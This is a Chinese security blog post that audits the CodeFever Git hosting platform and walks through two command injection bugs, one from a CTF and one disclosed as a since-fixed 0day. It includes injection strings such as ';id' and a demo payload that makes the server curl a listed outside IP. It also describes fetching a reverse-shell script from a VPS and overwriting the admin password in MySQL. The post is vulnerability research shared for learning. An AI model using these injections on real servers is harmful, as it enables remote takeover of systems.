---
layout:     post
title:      华夏erp代码审计
subtitle:   java
date:       2023-06-05
author:     lyk
header-img: img/post-bg-debug.png
catalog: true
tags:
    - java
---

由于本篇也具有0day，所以之前我加密了，还请原谅，但目前漏洞已提交至官方并修复，故公开以便大伙学习交流

![img](https://www.viewofthai.link/wp-content/uploads/2023/02/%E7%AC%AC%E4%B8%80%E4%B8%AA0day-300x164.png)



本篇仅作学习交流使用，切勿非法用途！

### 安装

源码：https://github.com/PGYER/codefever

两种安装方法，这里docker安装：

```shell
docker run -d --privileged=true --name codefever -p 80:80 -p 22:22 -it pgyer/codefever-community:latest /usr/sbin/init
```

### 代码审计-功能浅析

前面的我在西湖论剑里面写过，这里为了不让读者迷路复制了有用的部分过来

当时审计的时候认为这里有洞

![image-20230205171840632](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205171840632.png)



但是方向其实错误了

参考题解：[2023西湖论剑web-writeup题解wp (qq.com)](https://mp.weixin.qq.com/s/WnIhWkNsYB3TR1S1LItuqA)

这个cms还是体量比较大的那种，这里教大家一些骚操作，下载源码后先看docker-compose和dockerfile，了解到项目代码有一部分是安装包（比如misc文件夹等），同时也找到了docker里面的web目录`/data/www/codefever-community/`

有用的功能代码可能就这几个



![image-20230205174116350](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205174116350.png)



很快发现application的controller应该是业务核心代码，使用MVC架构的确符合大工程cms特定，同时，这里的代码是典型的跳转登录



![image-20230205174318067](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205174318067.png)



符合我们初次访问的url



![image-20230205174339360](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205174339360.png)



审计application这个mvc就能大致掌握业务逻辑了，有助于我们快速上手

大致审计了一下登录鉴权系统，没什么硬伤，倒是md5两次明文密码再存储值得很多辣鸡cms进行学习



![image-20230205174846926](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205174846926.png)



看到登录的话会返回u_key



![image-20230205175249322](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205175249322.png)



登录成功会跳到repositories，怀疑就是repository的功能代码了

经过了解，base.php应该是规范api请求的

创建一个仓库可以获取r_key



![image-20230205180449369](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205180449369.png)





![image-20230205180621853](https://raw.githubusercontent.com/hmt38/abcd/main//image-20230205180621853.png)



但是需要`u_key`,`g_key`的鉴权，猜名字应该就是user和组



![image-20230205180658225](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205180708146.png)



这里可以看到，没有g_key是直接新建不了的，上面的代码有所体现

可以注册用户。然后创建仓库。可以拿到rkey



![image-20230205181349760](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205181349760.png)



这个r_key本来就是业务需要公开的，所以随便找找api就有

### 代码审计-rce1

随后了解项目代码后，找可以rce的点，代码中有许多调用系统命令的地方，包括但不限于run,execCommand，bantch等（在command里）

这里直接说答案（西湖论剑2023git那题），发现BlameInfo_get->getblameinfo->run 可以利用

BlameInfo_get仍然是在respository里面的一个业务代码



![image-20230205181846040](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205181846040.png)



可控的地方是revision和path

我们看一下`getBlameInfo`

```java
public function getBlameInfo(string $rKey, string $uKey, string $revision, string $filepath)
{
    // get repository internal url
    $repositoryURL = $this->getAccessURL($rKey, $uKey);
 
    if (!$repositoryURL) {
        return FALSE;
    }
 
    $revision = Command::wrapArgument($revision);
    $filepath = Command::wrapArgument($filepath);
 
    // create target repository workspace
    $workspace = Workspace::create();
 
    // clone target repository
    $status = Command::runWithoutOutput([
        'cd', $workspace, '&&',
        YAML_CLI_GIT, 'clone', $repositoryURL, '.'
    ]);
 
    if (!$status) {
        Workspace::delete($workspace);
        return FALSE;
    }
 
    $output = [];
    $status = Command::run([
        'cd', $workspace, '&&',
        YAML_CLI_GIT, 'checkout', $revision, '&&',
        YAML_CLI_GIT, 'blame', '-p', $revision, $filepath
    ], $output);
 
    if (!$status) {
        Workspace::delete($workspace);
        return FALSE;
    }
 
    Workspace::delete($workspace);
 
    $output = Helper::parseBlameData($output);
 
    // return merge result
    return $output;
}
```

可以看到一开始我们进入到这里

```java
$revision = Command::wrapArgument($revision);
    $filepath = Command::wrapArgument($filepath);
```



![image-20230205182351760](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205182351760.png)



这是一个过滤，可以看到原来注释的代码，原意应该是做一个转义，但是后面这样改安全多了



![image-20230205183430596](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205183430596.png)



特殊字符会被过滤（这里过滤了空格，引号，$符号，竖线）



![image-20230205183505421](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205183505421.png)



结果run又使用空格连接array参数



![image-20230205183641982](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205183641982.png)



这里大概是可以rce的，只要想到命令注入的一些绕过（这里只过滤了空格，引号，$符号，竖线）就可以，

比如说

```
;id
```

最后run参数是这样操作的

```java
$status = Command::run([
            'cd', $workspace, '&&',
            YAML_CLI_GIT, 'checkout', $revision, '&&',
            YAML_CLI_GIT, 'blame', '-p', $revision, $filepath
        ], $output);
```

每个元素直接都会加上空格，不难想到可以

```java
$revision=;curl
$filepath=vps
```

可以写个demo测一测，调一调，快乐十分

```php
<?php
 
function wrapArgument(string $argument)
{
//         $argument = str_replace('\\', '\\\\',$argument);
//         $argument = str_replace('"', '\"',$argument);
//         return '"' . $argument . '"';
 
    $pattern = [
        '/(^|[^\\\\])((\\\\\\\\)*[\s\'\"\$\|])/',
        '/(^|[^\\\\])((\\\\\\\\)*\\\\([^\s\'\"\|\$\\\\]|$))/'
    ];
    $replacement = [
        '$1\\\\$2',
        '$1\\\\$2'
    ];
 
    $result = preg_replace($pattern, $replacement, $argument);
    while ($result !== $argument) {
        $argument = $result;
        $result = preg_replace($pattern, $replacement, $argument);
    }
 
    return $result;
    // return '"' . $result . '"';
}
 
$workspace="/var/www/html";
$revision=";`curl";
$filepath="http://8.129.42.140:3307";
 
$revision = wrapArgument($revision);
$filepath = wrapArgument($filepath);
 
echo $revision;echo "\n";
echo $filepath;echo "\n";
 
$command=[
    'cd', $workspace, '&&',
    'YAML_CLI_GIT', 'checkout', $revision, '&&',
    'YAML_CLI_GIT', 'blame', '-p', $revision, $filepath
];
echo implode(' ', $command);
```



![image-20230205192029471](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205192029471.png)



这样应该是可以了，反引号可以不用的

实战测一下



![image-20230205190839084](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205190839084.png)



后面就是vps上传反弹shell的sh，然后给靶机执行，执行后需要登录mysql覆盖admin密码才能登录后台getflag，后面的没啥操作，主要还是前面getshell

至于如何调到blameInfo_get这个函数呢

通过不断的在后台抓包，观察各个api，可以发现规律：访问/api/repository/xxx就可以调用到xxx_get

例如



![image-20230205185934729](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205185934729.png)



就是



![image-20230205190005122](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205190005122.png)



具体实现应该是在api.php里面，大概像是这样，这是很多mvc都具备的特点



![image-20230205185751474](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230205185751474.png)



### 代码审计-rce2

按照这个思路，先找找所有调用到command里面几个危险函数的代码



![image-20230206135822108](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230206135822108.png)



经过人工审计，基本上run和runwithout都没有可控位点，只能从bantch这个地方一路找过来，



![image-20230206135907899](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230206135907899.png)



挖了一下execCommand，

```java
    public function execCommand(string $rKey, string $uKey, string $commandType, string $command = NULL)
    {
        if (!$rKey) {
            return FALSE;
        }
 
        if ($commandType != GIT_COMMAND_INIT && !$command) {
            return FALSE;
        }
 
        $userInfo = $this->userModel->get($uKey);
 
        if (!$userInfo) {
            return FALSE;
        }
 
        $repositoryInfo = $this->get($rKey);
 
        if (!$repositoryInfo) {
            return FALSE;
        }
 
        $storagePath = dirname(APPPATH) . '/git-storage';
        $repositoryPath = $storagePath . $repositoryInfo['r_path'];
        $name = explode('@', $userInfo['u_email'])[0];
        $email = $userInfo['u_email'];
 
        switch ($commandType) {
            case GIT_COMMAND_INIT:
                $commands = [
                    "mkdir {$repositoryPath}",
                    "cd {$repositoryPath}",
                    YAML_CLI_GIT . " init --bare",
                    "rm -r hooks",
                    "ln -s ../../misc/hooks hooks",
                    "chmod -R 0777 {$repositoryPath}",
                ];
                break;
            case GIT_COMMAND_FORK:
                $commands = [
                    "mkdir {$repositoryPath}",
                    "cd {$repositoryPath}",
                    YAML_CLI_GIT . " clone --bare {$command} .",
                    YAML_CLI_GIT . " remote remove origin",
                    "rm -r hooks",
                    "ln -s ../../misc/hooks hooks",
                    "chmod -R 0777 {$repositoryPath}",
                ];
                break;
            case GIT_COMMAND_QUERY:
                $commands = [
                    "export GIT_COMMITTER_NAME={$name}",
                    "export GIT_COMMITTER_EMAIL={$email}",
                    "export GIT_AUTHOR_NAME={$name}",
                    "cd {$repositoryPath}",
                    YAML_CLI_GIT . " {$command}",
                ];
                break;
            case GIT_COMMAND_DIFF_REMOTE:
                $nonce = UUID::getKey();
                list($localCommitHash, $remoteRKey, $remoteAccessURL, $remoteCommitHash) = explode(self::DELIMITER, $command);
                $remoteName = $remoteRKey . $nonce;
                $commands = [
                    "cd {$repositoryPath}",
                    YAML_CLI_GIT . " remote add {$remoteName} {$remoteAccessURL}",
                    YAML_CLI_GIT . " fetch -q {$remoteName}",
                    YAML_CLI_GIT . " diff {$remoteCommitHash}...{$localCommitHash}",
                    YAML_CLI_GIT . " remote remove {$remoteName}",
                    YAML_CLI_GIT . " gc -q --prune=now",
                    "rm FETCH_HEAD",
                ];
                break;
            case GIT_COMMAND_LOG_REMOTE:
                $nonce = UUID::getKey();
                list($localCommitHash, $remoteRKey, $remoteAccessURL, $remoteCommitHash, $prettyPattern) = explode(self::DELIMITER, $command);
                $remoteName = $remoteRKey . $nonce;
                $commands = [
                    "cd {$repositoryPath}",
                    YAML_CLI_GIT . " remote add {$remoteName} {$remoteAccessURL}",
                    YAML_CLI_GIT . " fetch -q {$remoteName}",
                    YAML_CLI_GIT . " log --cherry-pick --left-only {$localCommitHash}...{$remoteCommitHash} --pretty=\"{$prettyPattern}\"",
                    YAML_CLI_GIT . " remote remove {$remoteName}",
                    YAML_CLI_GIT . " gc -q --prune=now",
                    "rm FETCH_HEAD",
                ];
                break;
        }
 
        return Command::batch($commands);
```

可以看到当`$commandType`是GIT_COMMAND_FORK，GIT_COMMAND_QUERY，GIT_COMMAND_DIFF_REMOTE，GIT_COMMAND_LOG_REMOTE 可以使得`$command`被执行, 其次，我们希望$command是可以为用户可控的

基于上面两个条件，找到了一些可能存在漏洞的api

比如说fork，createbranch

此外，还发现一个严重的问题

execCommand



![image-20230206141050823](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230206141050823.png)



假如email未经过滤直接拼接进入系统是很危险的

此外，我们需要可以访问到这些api

很快发现



![image-20230206141412792](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230206141412792.png)



基于此，又找到了几个，最后发现有些地方email是直接无过滤直接拼接到execCommand的

于是做出尝试，email保存为如下



![image-20230206022016082](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230206022016082.png)



其实就是email那里直接追加;cmd

这时候请求config的时候会去调config_get,这时候发现就触发rce了。里面最终会进入到execCommand的



![image-20230206021317203](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230206021317203.png)



修复建议是规范email的形式

我们再仔细看看，复原一下这个过程

```java
 public function config_get()
    {
        $userInfo = Request::parse()->authData['userData'];
        $rKey = Request::parse()->query['rKey'];
        $uKey = $userInfo['u_key'];
 
        if (!$uKey || !$rKey) {
            Response::reject(0x0201);
        }
 
        if (!$this->service->requestRepositoryPermission(
            $rKey,
            $uKey,
            UserAccessController::UAC_REPO_READ
        )) {
            Response::reject(0x0106);
        }
 
        $config = [];
        $config['repository'] = $this->repositoryModel->get($rKey);
        $config['repository'] = $this->repositoryModel->normalize([$config['repository']])[0];
 
        $config['group'] = $this->groupModel->get($config['repository']['group']['id']);
        $config['group'] = $this->groupModel->normalize([$config['group']])[0];
 
        $config['members'] = $this->repositoryModel->getMembers($rKey);
 
        $config['branches'] = $this->repositoryModel->getBranchList($rKey, $uKey);
        ...
    }
```

这样的话会进入到getBranchList



![image-20230206141507850](https://raw.githubusercontent.com/hmt38/abcd/main/image-20230206141507850.png)



这样就进入到execCommand了，随后触发rce的地方就如同上文描述的一样，由于没mail进行过滤直接命令拼接

这里涉及[0day吧]([codefever-vulnerability/CodeFever has remote command execution.md at main · hmt38/codefever-vulnerability (github.com)](https://github.com/hmt38/codefever-vulnerability/blob/main/CodeFever has remote command execution.md))，而且好像蒲公英这个公司还是有点大的诶
